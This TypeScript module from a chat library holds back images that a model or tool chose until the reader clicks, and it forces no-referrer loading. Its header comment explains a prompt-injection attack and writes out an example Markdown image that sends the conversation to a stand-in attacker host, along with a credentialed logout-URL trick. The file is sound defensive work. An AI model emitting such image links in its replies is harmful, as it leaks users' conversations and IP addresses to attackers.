/**
 * The image policy: which pictures a reply fetches before anyone asks it to.
 *
 * An `<img>` fetches its address the moment it is inserted, and that address is whatever
 * the model or a tool wrote. A prompt-injected reply that writes
 * `![](https://attacker.example/c.png?d=<the conversation>)` sends the conversation, the
 * reader's IP and their browser to that host with no click — while the reply streams, and
 * again each time the conversation is shown. The sanitizer cannot refuse it on its scheme:
 * `https:` is the scheme every legitimate picture has.
 *
 * So a picture a model or a tool chose loads only when the app said it may. By default that
 * is only what makes no request, `data:` and `blob:`; `setImagePolicy` names the rest — the
 * page's own origin as `'self'`, a CDN by its origin, or a function. Any other image is HELD:
 * it becomes a small link that says where it would load from, and a click loads it in place.
 * Nothing vanishes without a trace, and nothing is fetched that the reader did not ask for.
 *
 * Why not the page's own origin by default: it carries the reader's cookies, so
 * `![](/api/logout)` is a credentialed request the model chose, and an open redirect on the
 * site (`/login?next=…`, a link tracker) turns a picture from the site into a picture from
 * anywhere. The browser follows a redirect for an image, and no script on the page sees it.
 * A CSP `img-src` does see it; this policy is what the library can do on its own.
 *
 * Every picture that does load goes with `referrerpolicy="no-referrer"`: which page shows it
 * is not the image host's business.
 *
 * Three readers: `AparteConfig.sanitizeHtml`, after whichever sanitizer is active, so a
 * replaced one keeps the rule; an incremental Markdown provider, before it sets a `src` on a
 * live node; and a plugin that draws pictures itself, through `AparteConfig.decideImage`.
 */
import { escapeAttr, escapeHtml } from '../utils/escape.js';
import { readTag } from './sanitize.js';

/** What a picture a model or a tool chose does: load now, wait for a click, or go. */
export type AparteImageDecision = 'load' | 'hold' | 'drop';

/**
 * Which pictures load without a click.
 *
 * - A list: `'self'` (the page's own origin), `'*'` (every picture), or an origin
 *   (`'https://cdn.example.com'`). A picture from anywhere else is held.
 * - A function, for a rule a list cannot say: it gets the picture's address, resolved
 *   against the page when there is one, and answers `'load'`, `'hold'` or `'drop'`.
 *
 * `data:` and `blob:` pictures always load, whatever the policy says: they make no request.
 */
export type AparteImagePolicy = readonly string[] | ((url: string) => AparteImageDecision);

/** A policy compiled once: what an address, and the URL it resolves to (if it does), decide. */
export type ImageDecider = (address: string, url: URL | null) => AparteImageDecision;

/** The words and the glyph a held picture shows. */
export interface HeldImageWords {
    /** Its tooltip, and its name when it has no description: "Load the image from {host}". */
    load(host: string): string;
    /** Its name when it has one: "Load the image “{alt}” from {host}". */
    named(host: string, alt: string): string;
    /** The image glyph's markup. */
    icon: string;
}

/**
 * An address resolved the way the browser will resolve it, or `null` when it cannot be: a
 * relative one where there is no page to resolve it against (a server render), or no address.
 */
export function resolveImageAddress(address: string): URL | null {
    const base = typeof document === 'undefined' ? undefined : document.baseURI;
    try {
        return base ? new URL(address, base) : new URL(address);
    } catch {
        return null;
    }
}

/** The page's own origin, when there is a page. */
function pageOrigin(): string | null {
    const origin = typeof location === 'undefined' ? null : location.origin;
    return origin && origin !== 'null' ? origin : null;
}

/** The origin an entry of the list names, or `null` when it names none. */
function originOf(entry: string): string | null {
    try {
        const url = new URL(entry);
        return url.protocol === 'http:' || url.protocol === 'https:' ? url.origin : null;
    } catch {
        return null;
    }
}

/** Whether two policies say the same thing: the same function, or lists with the same entries. */
export function sameImagePolicy(a: AparteImagePolicy, b: AparteImagePolicy): boolean {
    if (a === b) return true;
    if (typeof a === 'function' || typeof b === 'function') return false;
    return a.length === b.length && a.every((entry, i) => entry === b[i]);
}

/** A function policy that threw once has said so: one line per policy, not one per picture. */
const threw = new WeakSet<object>();

/** Turn a policy into the function every decision runs through. */
export function compileImagePolicy(policy: AparteImagePolicy): ImageDecider {
    if (typeof policy === 'function') {
        return (address, url) => {
            try {
                const answer = policy(url ? url.href : address);
                // Anything but the two other answers holds: a typo must not load a picture.
                return answer === 'load' || answer === 'drop' ? answer : 'hold';
            } catch (error) {
                if (!threw.has(policy)) {
                    threw.add(policy);
                    console.warn('[aparte] The image policy threw, so the pictures it was asked about are held.', error);
                }
                return 'hold';
            }
        };
    }
    let every = false;
    let self = false;
    const origins = new Set<string>();
    for (const entry of policy) {
        const word = typeof entry === 'string' ? entry.trim() : '';
        if (word === '*') every = true;
        // CSP spells it with quotes, and a list copied from a CSP header should not hold the site.
        else if (word === 'self' || word === "'self'") self = true;
        else {
            const origin = originOf(word);
            if (origin) origins.add(origin);
            else console.warn(`[aparte] setImagePolicy: ${JSON.stringify(entry)} is not 'self', '*' or an http(s) origin, so it allows nothing.`);
        }
    }
    return (_address, url) => {
        if (every) return 'load';
        if (!url) return 'hold';
        if (origins.has(url.origin)) return 'load';
        return self && url.origin === pageOrigin() ? 'load' : 'hold';
    };
}

// eslint-disable-next-line no-control-regex -- C0 controls are what a URL parser strips, so they are no address
const NO_ADDRESS = /^[\u0000- ]*$/;

/**
 * What the picture at `address` does. `data:` and `blob:` load, an address that is no web
 * address (`ftp:`, `mailto:`) goes, and the policy decides the rest — except that a picture the
 * reader already chose to see (`shown`) loads when the policy would only have held it.
 */
export function decideImageAddress(decide: ImageDecider, address: string, shown?: ReadonlySet<string>): AparteImageDecision {
    // `src=""` fetches nothing: there is nothing to decide.
    if (NO_ADDRESS.test(address)) return 'load';
    const url = resolveImageAddress(address);
    if (url) {
        if (url.protocol === 'data:' || url.protocol === 'blob:') return 'load';
        if (url.protocol !== 'http:' && url.protocol !== 'https:') return 'drop';
    }
    const decision = decide(address, url);
    return decision === 'hold' && url !== null && shown?.has(url.href) ? 'load' : decision;
}

/** The pictures a reader chose to see, per config, so a redraw shows them again. */
const shownImages = new WeakMap<object, Set<string>>();

/** Remember that the reader chose to see the picture at `address`, under `owner` (a config). */
export function rememberShownImage(owner: object, address: string): void {
    const url = resolveImageAddress(address);
    if (!url) return;
    let shown = shownImages.get(owner);
    if (!shown) shownImages.set(owner, (shown = new Set()));
    shown.add(url.href);
}

/** The pictures the reader chose to see under `owner`. */
export function shownImagesOf(owner: object): ReadonlySet<string> | undefined {
    return shownImages.get(owner);
}

/** Forget them: a reset config starts from what its policy says. */
export function forgetShownImages(owner: object): void {
    shownImages.delete(owner);
}

/** HTML's whitespace, which a browser splits a `srcset` on: not JavaScript's `\s`, which also takes U+00A0 and U+FEFF. */
const ASCII_WHITESPACE = /[\t\n\f\r ]/;

/** One `srcset` candidate: its address and its descriptor (`''`, `2x`, `640w`, `640w 480h`). */
export interface SrcsetCandidate {
    url: string;
    descriptor: string;
}

/** The descriptors kept: none, a density, a width, or a width and a height. */
const DESCRIPTOR = /^(?:|\d+w(?: \d+h)?|(?:\d+|\d*\.\d+)(?:[eE][+-]?\d+)?x)$/;

/**
 * A `srcset`, read as the HTML Standard's "parse a srcset attribute" reads it — in the details a
 * difference would turn into a request. Only ASCII whitespace separates: a JavaScript `\s` also
 * splits on U+00A0 and U+FEFF, which a browser keeps inside an address (`&nbsp;data:…/../api/logout`
 * is a path on the page's own site to it). An address runs to the next such space, so a `data:`
 * URL keeps its commas; trailing commas end a candidate; a descriptor's parentheses do not nest
 * (`1x ((), https://…` is two candidates to a browser, not one).
 *
 * A candidate with descriptors this does not know is left out. That is safe in one direction
 * only, and it is the direction the pass relies on: what reaches the page is never the model's
 * `srcset` but one written again from these candidates (`writeSrcset`), so a browser can only
 * pick an address that was judged.
 */
export function parseSrcset(value: string): SrcsetCandidate[] {
    const candidates: SrcsetCandidate[] = [];
    const n = value.length;
    let i = 0;
    while (i < n) {
        while (i < n && (ASCII_WHITESPACE.test(value[i]!) || value[i] === ',')) i++;
        if (i >= n) break;
        const from = i;
        while (i < n && !ASCII_WHITESPACE.test(value[i]!)) i++;
        let url = value.slice(from, i);
        const descriptors: string[] = [];
        if (url.endsWith(',')) {
            url = url.replace(/,+$/, '');
        } else {
            let current = '';
            let state: 'in' | 'parens' | 'after' = 'in';
            for (;;) {
                const c = value[i];
                if (state === 'in') {
                    if (c === undefined) { if (current) descriptors.push(current); break; }
                    if (c === ',') { i++; if (current) descriptors.push(current); break; }
                    if (ASCII_WHITESPACE.test(c)) {
                        if (current) descriptors.push(current);
                        current = '';
                        state = 'after';
                    } else {
                        current += c;
                        if (c === '(') state = 'parens';
                    }
                } else if (state === 'parens') {
                    if (c === undefined) { descriptors.push(current); break; }
                    current += c;
                    if (c === ')') state = 'in';
                } else {
                    if (c === undefined) break;
                    // Anything but a space opens the next descriptor, read again in that state.
                    if (!ASCII_WHITESPACE.test(c)) { state = 'in'; continue; }
                }
                i++;
            }
        }
        const descriptor = descriptors.join(' ');
        if (url && DESCRIPTOR.test(descriptor)) candidates.push({ url, descriptor });
    }
    return candidates;
}

/** The addresses a `srcset` lists, as `parseSrcset` reads them. */
export function srcsetUrls(value: string): string[] {
    return parseSrcset(value).map((candidate) => candidate.url);
}

/** Candidates written as a `srcset` a browser reads back exactly as they are. */
function writeSrcset(candidates: SrcsetCandidate[]): string {
    return candidates.map((c) => (c.descriptor ? `${c.url} ${c.descriptor}` : c.url)).join(', ');
}

/**
 * Where a held picture would load from, as the reader is shown it: the host, exactly — a
 * look-alike name is the reason to show it, which is also why its end, the part a reader
 * judges by, is never cut (the chip wraps it) — and, for an address that resolves to no host
 * (a relative one on a server), the address itself, cut short.
 */
export function imageHost(address: string): string {
    const url = resolveImageAddress(address);
    if (url?.hostname) return url.hostname;
    const bare = address.trim();
    return bare.length > 48 ? `${bare.slice(0, 47)}…` : bare;
}

/**
 * A held picture: a link to it that wears the tag recipe, names where it would load from, and
 * carries what it holds in two attributes, so a later pass can draw it again from them alone.
 * Without script it opens the picture in a new tab; with core's listener it loads in place.
 *
 * Inside a link (`[![build](badge.svg)](https://ci…)`) it is a `<span role="button">` instead: a
 * link inside a link is taken apart by the HTML parser, which would leave the reply's own link
 * empty and the picture outside it.
 */
export function heldImageHtml(address: string, alt: string, words: HeldImageWords, inLink = false): string {
    const host = imageHost(address);
    const name = alt ? words.named(host, alt) : words.load(host);
    const icon = words.icon; // safe-text: the chat's own image glyph (core's, or the app's icon provider's), markup on purpose
    const opening = inLink
        ? '<span class="aparte-tag aparte-image-held" role="button" tabindex="0"'
        : `<a class="aparte-tag aparte-image-held" href="${escapeAttr(address)}" target="_blank" rel="noopener noreferrer"`;
    return `${opening} data-aparte-image="${escapeAttr(address)}"${alt ? ` data-aparte-image-alt="${escapeAttr(alt)}"` : ''}`
        + ` title="${escapeAttr(words.load(host))}" aria-label="${escapeAttr(name)}">`
        + `<span class="aparte-image-held__icon" aria-hidden="true">${icon}</span>`
        + (alt ? `<span class="aparte-tag__label aparte-image-held__alt">${escapeHtml(alt)}</span>` : '')
        + `<span class="aparte-image-held__host">${escapeHtml(host)}</span>${inLink ? '</span>' : '</a>'}`;
}

/** A picture the policy lets load, drawn from what a held one carried. */
function loadedImageHtml(address: string, alt: string): string {
    return `<img src="${escapeAttr(address)}" alt="${escapeAttr(alt)}" referrerpolicy="no-referrer">`;
}

/** Whether a string may hold anything the pass rewrites: almost every reply holds none. */
const MAY_HOLD = /<(?:img|source)\b|data-aparte-image/i;

/** A held picture already drawn, in either form. */
const HELD = 'a[data-aparte-image], span[data-aparte-image]';

/**
 * Apply the policy to sanitized HTML. A picture's own address — its `src`, else its first
 * `srcset` one — decides what it does: it loads, it is held (drawn as `heldImageHtml`), or it
 * goes. One that loads gains `referrerpolicy="no-referrer"` and keeps, of its `srcset`, only the
 * candidates that load, written again (`writeSrcset`) so the browser picks among exactly what was
 * judged; a `<source>` keeps its loading candidates the same way, or goes. A held picture already
 * in the HTML is drawn again from what it carries, so running the pass twice gives what running
 * it once gave, and a picture the reader chose to see stays shown however it was written.
 *
 * In a browser it walks an inert `<template>`, where nothing it touches is fetched; without a
 * DOM it reads the tags the way the sanitizer's own DOM-free path does.
 */
export function applyImagePolicy(html: string, decide: (address: string) => AparteImageDecision, words: () => HeldImageWords): string {
    if (!html || !MAY_HOLD.test(html)) return html;
    return typeof document === 'undefined' ? applyImagePolicyWithoutDom(html, decide, words) : applyInTemplate(html, decide, words);
}

/**
 * What one `<img>` does, from its own address, and the `srcset` it keeps when it loads (`null`
 * for none). `null` for a picture with no address at all: it fetches nothing of its own.
 */
function judgeImage(src: string, srcset: string | undefined, decide: (address: string) => AparteImageDecision): { decision: AparteImageDecision; address: string; srcset: string | null } | null {
    const candidates = srcset === undefined ? [] : parseSrcset(srcset);
    const address = NO_ADDRESS.test(src) ? candidates[0]?.url : src;
    if (address === undefined) return null;
    const decision = decide(address);
    if (decision !== 'load') return { decision, address, srcset: null };
    const kept = candidates.filter((c) => decide(c.url) === 'load');
    return { decision, address, srcset: kept.length ? writeSrcset(kept) : null };
}

/**
 * What a `<source>` keeps: `false` when it goes (its `src` does not load, or no candidate of
 * its `srcset` does), else the `srcset` to write (`null` when it keeps none).
 */
function judgeSource(src: string, srcset: string | undefined, decide: (address: string) => AparteImageDecision): string | null | false {
    if (!NO_ADDRESS.test(src) && decide(src) !== 'load') return false;
    if (srcset === undefined) return NO_ADDRESS.test(src) ? false : null;
    const kept = parseSrcset(srcset).filter((c) => decide(c.url) === 'load');
    if (kept.length) return writeSrcset(kept);
    return NO_ADDRESS.test(src) ? false : null;
}

function applyInTemplate(html: string, decide: (address: string) => AparteImageDecision, words: () => HeldImageWords): string {
    const template = document.createElement('template');
    template.innerHTML = html;
    const root = template.content;
    let held: HeldImageWords | undefined;
    // Untouched HTML comes back as it came: serializing it again would rewrite what the pass
    // did not change (quotes, a closing tag), which a caller comparing output need not see.
    let changed = false;
    const fragment = (markup: string): DocumentFragment => {
        const holder = document.createElement('template');
        holder.innerHTML = markup;
        return holder.content;
    };
    for (const chip of Array.from(root.querySelectorAll(HELD))) {
        const address = chip.getAttribute('data-aparte-image') ?? '';
        const alt = chip.getAttribute('data-aparte-image-alt') ?? '';
        const decision = NO_ADDRESS.test(address) ? 'drop' : decide(address);
        changed = true;
        if (decision === 'drop') chip.remove();
        else chip.replaceWith(fragment(decision === 'load'
            ? loadedImageHtml(address, alt)
            : heldImageHtml(address, alt, held ??= words(), !!chip.parentElement?.closest('a'))));
    }
    for (const source of Array.from(root.querySelectorAll('source'))) {
        const kept = judgeSource(source.getAttribute('src') ?? '', source.getAttribute('srcset') ?? undefined, decide);
        if (kept === false) { source.remove(); changed = true; continue; }
        if (kept === null) {
            if (source.hasAttribute('srcset')) { source.removeAttribute('srcset'); changed = true; }
        } else if (kept !== source.getAttribute('srcset')) {
            source.setAttribute('srcset', kept);
            changed = true;
        }
    }
    for (const img of Array.from(root.querySelectorAll('img'))) {
        const judged = judgeImage(img.getAttribute('src') ?? '', img.getAttribute('srcset') ?? undefined, decide);
        if (!judged) {
            // No address of its own: a `srcset` holding no candidate is nothing to keep, and a
            // parent `<picture>` may still feed it a `<source>`, sent under ITS referrer policy.
            if (img.hasAttribute('srcset')) { img.removeAttribute('srcset'); changed = true; }
            if (img.parentElement?.localName === 'picture' && img.getAttribute('referrerpolicy') !== 'no-referrer') {
                img.setAttribute('referrerpolicy', 'no-referrer');
                changed = true;
            }
            continue;
        }
        changed = true;
        if (judged.decision === 'drop') { img.remove(); continue; }
        if (judged.decision === 'hold') {
            img.replaceWith(fragment(heldImageHtml(judged.address, img.getAttribute('alt') ?? '', held ??= words(), !!img.closest('a'))));
            continue;
        }
        if (judged.srcset === null) img.removeAttribute('srcset');
        else img.setAttribute('srcset', judged.srcset);
        img.setAttribute('referrerpolicy', 'no-referrer');
    }
    return changed ? template.innerHTML : html;
}

/** Elements whose text a browser does not read as markup: the pass copies them through. */
const RAW_TEXT = new Set(['script', 'style', 'textarea', 'title', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript', 'plaintext']);
/** Elements with no end tag. */
const VOID = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'source', 'track', 'wbr']);
const ASCII_LETTER = /[A-Za-z]/;
const SAFE_NAME = /^[a-z][a-z0-9_.:-]*$/;

/** A start tag written again from its attributes, `replace` setting (a value) or removing (`null`) some. */
function writeTag(tag: string, attrs: Array<[string, string]>, replace: Record<string, string | null>): string {
    const kept = attrs.filter(([name]) => !(name in replace) && SAFE_NAME.test(name));
    const added = Object.entries(replace).filter((entry): entry is [string, string] => entry[1] !== null);
    return `<${tag}${[...kept, ...added].map(([name, value]) => ` ${name}="${escapeAttr(value)}"`).join('')}>`;
}

/**
 * Where the element whose start tag ends at `from` ends: past the end tag that matches it, same
 * names nested counted, or `-1` when there is none.
 */
function endOf(lower: string, tag: string, from: number): number {
    const tags = new RegExp(`<(/?)${tag}(?=[\\s/>])`, 'g');
    tags.lastIndex = from;
    let depth = 1;
    for (let m = tags.exec(lower); m; m = tags.exec(lower)) {
        depth += m[1] ? -1 : 1;
        if (depth === 0) {
            const close = lower.indexOf('>', m.index);
            return close < 0 ? lower.length : close + 1;
        }
    }
    return -1;
}

/**
 * The same pass for a runtime with no DOM (a server render, a Worker). Like the sanitizer's
 * DOM-free path it is a safety net, not a parser: it reads tags with the sanitizer's own
 * reader, leaves comments and raw-text elements alone, and writes back only what it changed.
 * Exported for the parity suite; not from the package barrel.
 */
export function applyImagePolicyWithoutDom(html: string, decide: (address: string) => AparteImageDecision, words: () => HeldImageWords): string {
    if (!html || !MAY_HOLD.test(html)) return html;
    const lower = html.toLowerCase();
    const n = html.length;
    let held: HeldImageWords | undefined;
    let out = '';
    let i = 0;
    // The links open around the reading point, and the elements open, innermost last: what a
    // held picture is drawn as, and whether an <img> with no address of its own sits in a
    // <picture> that may still feed it a <source>.
    let links = 0;
    const open: string[] = [];
    while (i < n) {
        const lt = html.indexOf('<', i);
        if (lt < 0) { out += html.slice(i); break; }
        out += html.slice(i, lt);
        if (html.startsWith('<!--', lt)) {
            const close = html.indexOf('-->', lt + 4);
            const stop = close < 0 ? n : close + 3;
            out += html.slice(lt, stop);
            i = stop;
            continue;
        }
        const closing = html[lt + 1] === '/';
        const nameAt = lt + (closing ? 2 : 1);
        if (!ASCII_LETTER.test(html[nameAt] ?? '')) { out += '<'; i = lt + 1; continue; }
        const { tag, attrs, end } = readTag(html, nameAt);
        if (end < 0) { out += html.slice(lt); break; }
        i = end;
        const written = html.slice(lt, end);
        if (closing) {
            if (tag === 'a') links = Math.max(0, links - 1);
            const at = open.lastIndexOf(tag);
            if (at >= 0) open.length = at;
            out += written;
            continue;
        }
        const attr = (name: string): string | undefined => attrs.find(([key]) => key === name)?.[1];
        if (RAW_TEXT.has(tag)) {
            const close = lower.indexOf(`</${tag}`, end);
            const stop = close < 0 ? n : close;
            out += written + html.slice(end, stop);
            i = stop;
            continue;
        }
        if ((tag === 'a' || tag === 'span') && attr('data-aparte-image') !== undefined) {
            // A held picture: drawn again whole. One left open is drawn from its start tag
            // alone, so a forged one cannot swallow what follows it.
            const stop = endOf(lower, tag, end);
            if (stop >= 0) i = stop;
            else if (tag === 'a') links += 1;
            const address = attr('data-aparte-image') ?? '';
            const alt = attr('data-aparte-image-alt') ?? '';
            const decision = NO_ADDRESS.test(address) ? 'drop' : decide(address);
            if (decision === 'load') out += loadedImageHtml(address, alt);
            else if (decision === 'hold') out += heldImageHtml(address, alt, held ??= words(), links > 0);
            continue;
        }
        if (tag === 'a') links += 1;
        if (tag === 'source') {
            const kept = judgeSource(attr('src') ?? '', attr('srcset'), decide);
            if (kept === false) continue;
            out += kept === (attr('srcset') ?? null) ? written : writeTag(tag, attrs, { srcset: kept });
            continue;
        }
        if (tag === 'img') {
            const judged = judgeImage(attr('src') ?? '', attr('srcset'), decide);
            if (!judged) {
                const inPicture = open[open.length - 1] === 'picture';
                if (attr('srcset') === undefined && (!inPicture || attr('referrerpolicy') === 'no-referrer')) out += written;
                else out += writeTag(tag, attrs, { srcset: null, ...(inPicture ? { referrerpolicy: 'no-referrer' } : {}) });
                continue;
            }
            if (judged.decision === 'hold') out += heldImageHtml(judged.address, attr('alt') ?? '', held ??= words(), links > 0);
            else if (judged.decision === 'load') out += writeTag(tag, attrs, { srcset: judged.srcset, referrerpolicy: 'no-referrer' });
            continue;
        }
        // A void element opens nothing; the rest is tracked for the <picture> an <img> sits in.
        if (!VOID.has(tag) && !written.endsWith('/>')) open.push(tag);
        out += written;
    }
    return out;
}
